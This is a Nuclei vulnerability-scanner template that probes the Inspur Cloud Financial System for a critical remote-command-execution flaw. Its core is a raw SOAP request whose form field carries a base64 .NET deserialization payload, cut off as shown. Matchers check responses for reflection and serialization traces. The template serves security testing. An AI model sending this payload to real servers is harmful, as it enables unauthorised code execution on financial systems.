common/config/pocs/nuclei-2025/langchao-cloud-financial-system-rce.yaml

http:
    - matchers:
        - status:
            - 500
            - 200
          type: status
        - part: body
          type: word
          words:
            - System.Reflection.Assembly
            - System.Runtime.Serialization
        - part: body
          regex:
            - <GetChildFormAndEntityListResponse.*>.*</GetChildFormAndEntityListResponse>
          type: regex
      matchers-condition: and
      raw:
        - |
          POST /cwbase/gsp/webservice/bizintegrationwebservice/bizintegrationwebservice.asmx HTTP/1.1
          Host: {{Hostname}}
          Content-Type: text/xml; charset=utf-8
          SOAPAction: "http://tempuri.org/GetChildFormAndEntityList"

          <?xml version="1.0" encoding="utf-8"?>
          <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
          <GetChildFormAndEntityList xmlns="http://tempuri.org/">
          <baseFormID>validStringID</baseFormID>
          <baseEntityID>validStringID</baseEntityID>
          <strFormAssignment>AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0u...</strFormAssignment>
          <isBase>false</isBase>
          </GetChildFormAndEntityList>
          </soap:Body>
          </soap:Envelope>
id: langchao-cloud-financial-system-rce
info:
    author: ProjectDiscoveryAI
    description: |
        This template checks for a command execution vulnerability in the Inspur Cloud Financial System through its SOAP interface.
    name: Inspur Cloud Financial System Command Execution Vulnerability
    severity: critical
    tags:
        - soap
        - critical
